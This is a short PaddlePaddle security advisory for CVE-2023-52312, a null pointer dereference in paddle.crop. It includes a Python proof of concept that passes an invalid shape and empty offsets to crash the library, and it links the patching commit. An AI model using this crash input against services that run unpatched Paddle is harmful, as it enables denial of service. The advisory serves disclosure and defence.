## PDSA-2023-021: Null pointer dereference in paddle.crop

### CVE Number

CVE-2023-52312

### Impact

Null pointer dereference in `paddle.crop` when tensor dims are invalid . The PoC is as follows:

```python
import paddle
import numpy as np

x = paddle.to_tensor(np.random.uniform(0, 10, [2, 2]).astype(np.int32))
shape = paddle.to_tensor([-1, 0], dtype='int32')
offsets = paddle.to_tensor([], dtype='int32')

out = paddle.crop(x, shape, offsets)
```

### Patches

We have patched the issue in commit [c074de6911944d5d30d28cc7ce2c7099f1c87bce](https://github.com/PaddlePaddle/Paddle/pull/59967/commits/c074de6911944d5d30d28cc7ce2c7099f1c87bce).
